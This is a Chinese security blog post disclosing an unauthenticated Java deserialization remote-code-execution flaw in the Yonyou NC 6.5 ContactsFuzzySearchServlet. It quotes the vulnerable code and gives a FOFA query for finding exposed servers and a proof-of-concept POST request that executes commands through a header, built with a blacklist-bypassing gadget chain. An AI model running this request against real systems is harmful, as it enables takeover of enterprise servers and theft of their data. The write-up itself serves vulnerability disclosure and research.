---
title: "用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ContactsFuzzySearchServlet-rce.html
asset_dir: assets/用友nc-contactsfuzzysearchservlet反序列化代码执行rce漏洞
---

# 用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/6 08:37
* 847浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

计算机安全

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理软件，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`ContactsFuzzySearchServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`ContactsFuzzySearchServlet`反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞修复方案

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

深入探索

安全认证考试

编码转换工具

恶意软件分析工具

直接看下`ContactsFuzzySearchServlet`的实现

```
public class ContactsFuzzySearchServlet extends HttpServlet {
    private static final long serialVersionUID = -3711153542187076118L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();
        Logger.error("[searchStart]：");

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

物流软件安全

# 漏洞复现

```
POST /servlet/ContactsFuzzySearchServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

深入探索

安全研究报告

安全运维咨询

网页浏览器

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload

[![用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

[![用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞](images/img-002-bb1b5cd9e495.webp)](https://image.mrxn.net/f8cf05a8b1e647b7845661f576aa7452.webp)

成功执行命令并回显执行结果

安全工具开发

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞](https://mrxn.net/jswz/yonyou-nc-ContactsFuzzySearchServlet-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-ContactsFuzzySearchServlet-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ContactsFuzzySearchServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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